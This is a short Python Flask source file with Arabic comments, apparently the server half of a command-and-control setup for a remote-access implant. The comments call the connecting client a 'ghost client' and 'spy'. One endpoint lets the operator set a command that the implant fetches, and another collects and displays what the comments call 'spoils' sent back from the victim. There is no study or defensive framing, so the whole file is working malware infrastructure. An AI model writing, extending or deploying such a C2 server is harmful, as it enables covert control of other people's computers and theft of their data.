from flask import Flask, request, jsonify

app = Flask(__name__)

# متغير لتخزين الأمر المؤقت في الذاكرة السحابية
current_command = "No orders yet"
latest_result = ""

@app.route('/', methods=['GET'])
def home():
    return "HELLO, WORLD!"

# مسار المزامنة الخاص بالعميل والجاسوس
@app.route('/api/v1/sync', methods=['GET', 'POST'])
def sync_command():
    global current_command, latest_result

    if request.method == 'POST':
        # استقبال النتائج والغنائم القادمة من العميل الشبحي
        data = request.json
        if data and "result" in data:
            latest_result = data["result"]
            print(f"[+] Result received: {latest_result}")
        return jsonify({"status": "received"}), 200

    elif request.method=='GET':
        # إرسال الأمر الحالي للعميل الشبحي عند طلبه
        cmd = current_command
        return cmd, 200

# مسار مخصص لك لزرع الأمر الجديد في السيرفر
@app.route('/set_command', methods=['GET'])
def set_cmd():
    global current_command
    cmd = request.args.get('cmd', 'No orders yet')
    current_command = cmd
    return f"Command set to: {cmd}", 200

# مسار للاطلاع على الغنائم والنتائج التي أرسلها العميل
@app.route('/get_result', methods=['GET'])
def get_res():
    global latest_result
    return f"<pre>{latest_result}</pre>", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

